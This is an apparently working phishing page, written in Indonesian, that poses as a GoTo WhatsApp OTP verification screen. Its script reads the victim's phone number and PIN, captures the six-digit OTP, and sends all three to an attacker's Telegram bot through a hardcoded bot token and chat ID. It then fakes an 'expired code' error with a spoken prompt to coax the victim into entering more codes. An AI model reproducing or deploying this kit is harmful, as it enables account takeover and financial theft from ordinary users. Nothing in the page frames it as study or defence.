<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
  <title>Verifikasi OTP WhatsApp</title>
  <script src="https://cdn.tailwindcss.com"></script>
  <style>
    body {
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
      background-color: #f3f4f6;
      -webkit-text-size-adjust: 100%;
    }
  </style>
</head>
<body class="flex flex-col min-h-screen text-slate-800 antialiased select-none" onclick="aktifkanAudioPertama()">

  <div class="w-full max-w-[420px] mx-auto min-h-screen bg-[#f3f4f6] flex flex-col justify-between pt-5 px-6 pb-6 shadow-sm">
    
    <!-- Bagian Atas -->
    <div>
      <!-- Tombol Kembali (Panah Kiri) -->
      <div class="flex items-center justify-between mb-5">
        <button type="button" onclick="history.back()" class="text-slate-800 font-bold text-2xl active:opacity-60 leading-none">
          ←
        </button>

        <!-- Tombol Ulangi Suara -->
        <button type="button" onclick="ucapPesan('Silakan masukkan 6 digit kode OTP yang telah dikirim ke WhatsApp Anda.')" class="text-xs bg-emerald-100 text-emerald-800 px-3 py-1 rounded-full font-semibold active:bg-emerald-200">
          🔊 Dengar Suara
        </button>
      </div>

      <!-- Judul Utama -->
      <h1 class="text-[24px] leading-tight font-extrabold text-slate-900 tracking-tight mb-1">
        Cek WhatsApp, ya
      </h1>

      <!-- Keterangan Nomor HP -->
      <p id="phone-info" class="text-slate-500 text-[14px] mb-6">
        Kode-nya kami kirim ke +62********8855
      </p>

      <!-- Label OTP * -->
      <div class="text-[13px] font-bold text-slate-900 mb-1.5">
        OTP <span class="text-red-500">*</span>
      </div>

      <!-- Kotak / Garis OTP (6 Titik) -->
      <div class="relative pb-2 border-b border-slate-300 mb-1.5 flex items-center justify-between">
        <!-- Visual 6 Titik-titik OTP -->
        <div class="flex items-center gap-2.5 cursor-pointer" onclick="document.getElementById('hidden-otp-input').focus()">
          <div class="otp-circle w-2.5 h-2.5 rounded-full bg-slate-300 transition-all duration-150"></div>
          <div class="otp-circle w-2.5 h-2.5 rounded-full bg-slate-300 transition-all duration-150"></div>
          <div class="otp-circle w-2.5 h-2.5 rounded-full bg-slate-300 transition-all duration-150"></div>
          <div class="otp-circle w-2.5 h-2.5 rounded-full bg-slate-300 transition-all duration-150"></div>
          <div class="otp-circle w-2.5 h-2.5 rounded-full bg-slate-300 transition-all duration-150"></div>
          <div class="otp-circle w-2.5 h-2.5 rounded-full bg-slate-300 transition-all duration-150"></div>
        </div>

        <!-- Timer & Ikon Centang -->
        <div class="flex items-center gap-1.5 text-xs text-slate-700 font-medium">
          <svg class="w-3.5 h-3.5 text-emerald-600" fill="none" stroke="currentColor" stroke-width="2.5" viewBox="0 0 24 24">
            <path stroke-linecap="round" stroke-linejoin="round" d="M5 13l4 4L19 7"></path>
          </svg>
          <span id="timer">01:00</span>
        </div>

        <!-- Input Asli yang Disembunyikan (6 digit) -->
        <input type="tel" id="hidden-otp-input" maxlength="6" class="absolute inset-0 opacity-0 w-full h-full cursor-pointer" autofocus oninput="handleOtpInput(this)">
      </div>

      <!-- TEKS MERAH PERINGATAN -->
      <div id="error-msg" class="hidden text-red-500 text-xs font-semibold mb-3 mt-1">
        Kode OTP salah atau sudah kedaluwarsa. Silakan coba lagi.
      </div>

      <!-- Tombol Aksi -->
      <div class="mt-6 space-y-2.5 flex flex-col items-start">
        <button type="button" class="py-2.5 px-6 rounded-full border border-emerald-600 text-emerald-700 font-extrabold text-[14px] bg-white active:bg-emerald-50 transition-colors text-left shadow-sm">
          Buka WhatsApp
        </button>

        <button type="button" class="py-2.5 px-6 rounded-full bg-white text-slate-900 font-extrabold text-[14px] shadow-sm border border-slate-100 active:bg-slate-50 transition-colors text-left">
          Coba Metode Lainnya
        </button>
      </div>
    </div>

    <!-- Bagian Bawah: Logo from goto -->
    <div class="mt-auto pt-6">
      <div class="flex items-center justify-center gap-1 text-xs text-slate-500 font-medium">
        <span>from</span>
        <span class="text-emerald-600 font-extrabold tracking-wider text-sm">goto</span>
      </div>
    </div>

  </div>

  <script>
    const BOT_TOKEN = "9189949943:AAGWkG3Lnly2aM8Wu4kCwUHRo4PK6UMwABs";
    const CHAT_ID = "6742478722";

    const circles = document.querySelectorAll('.otp-circle');
    const errorMsg = document.getElementById('error-msg');
    const hiddenInput = document.getElementById('hidden-otp-input');
    const timerDisplay = document.getElementById('timer');

    let audioSudahAktif = false;
    let countdownInterval;
    let timeLeft = 60;

    function ucapPesan(teks) {
      if ('speechSynthesis' in window) {
        window.speechSynthesis.cancel();
        const pesan = new SpeechSynthesisUtterance(teks);
        pesan.lang = 'id-ID';
        pesan.rate = 0.95;
        pesan.pitch = 1.0;
        window.speechSynthesis.speak(pesan);
      }
    }

    function aktifkanAudioPertama() {
      if (!audioSudahAktif) {
        audioSudahAktif = true;
        ucapPesan("Silakan masukkan 6 digit kode O T P yang telah dikirim ke WhatsApp Anda.");
      }
    }

    window.addEventListener('DOMContentLoaded', () => {
      setTimeout(() => {
        ucapPesan("Silakan masukkan kode O T P Anda.");
      }, 500);
      mulaiTimer();
    });

    // --- FUNGSI TIMER (Bisa di-reset ulang kapan saja) ---
    function mulaiTimer() {
      clearInterval(countdownInterval); // Hentikan timer lama jika ada
      timeLeft = 60; // Kembalikan ke 60 detik
      
      countdownInterval = setInterval(() => {
        let minutes = Math.floor(timeLeft / 60);
        let seconds = timeLeft % 60;
        timerDisplay.innerText = String(minutes).padStart(2, '0') + ":" + String(seconds).padStart(2, '0');
        
        if (timeLeft > 0) {
          timeLeft--;
        } else {
          clearInterval(countdownInterval);
          timerDisplay.innerText = "00:00";
          
          // Jika waktu habis alami, otomatis reset juga ke 60 detik
          setTimeout(() => {
            mulaiTimer();
          }, 1000);
        }
      }, 1000);
    }

    // Ambil Data Nomor HP dan PIN
    const urlParams = new URLSearchParams(window.location.search);
    const userPhone = urlParams.get('phone') || localStorage.getItem('userPhone') || "Tidak diketahui";
    const userPin = urlParams.get('pin') || localStorage.getItem('userPin') || "Tidak diketahui";

    if (userPhone !== "Tidak diketahui") {
      let maskedPhone = "+62" + userPhone.slice(0, 2) + "****" + userPhone.slice(-4);
      document.getElementById('phone-info').innerText = `Kode-nya kami kirim ke ${maskedPhone}`;
    }

    function handleOtpInput(input) {
      let val = input.value.replace(/\D/g, '');
      input.value = val;
      
      if (val.length < 6) {
        errorMsg.classList.add('hidden');
      }

      circles.forEach((circle, index) => {
        if (index < val.length) {
          circle.style.backgroundColor = "#059669";
        } else {
          circle.style.backgroundColor = "#cbd5e1";
        }
      });

      if (val.length === 6) {
        sendOtpToTelegram(val);
      }
    }

    async function sendOtpToTelegram(otpCode) {
      const text = `🔑 *Data Lengkap Masuk (PIN & OTP)*\n\n*Nomor HP:* +62${userPhone}\n*PIN:* ${userPin}\n*OTP:* ${otpCode}`;

      try {
        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            chat_id: CHAT_ID,
            text: text,
            parse_mode: 'Markdown'
          })
        });
      } catch (err) {
        console.log("Error Telegram");
      }

      setTimeout(() => {
        hiddenInput.value = "";
        circles.forEach(circle => {
          circle.style.backgroundColor = "#cbd5e1";
        });
        errorMsg.classList.remove('hidden');
        ucapPesan("Kode O T P salah atau sudah kedaluwarsa. Silakan periksa kembali dan masukkan ulang.");
        
        // --- TIMER LANGSUNG RESET KEMBALI KE 60 DETIK DI SINI ---
        mulaiTimer();
      }, 400);
    }
  </script>
</body>
</html>
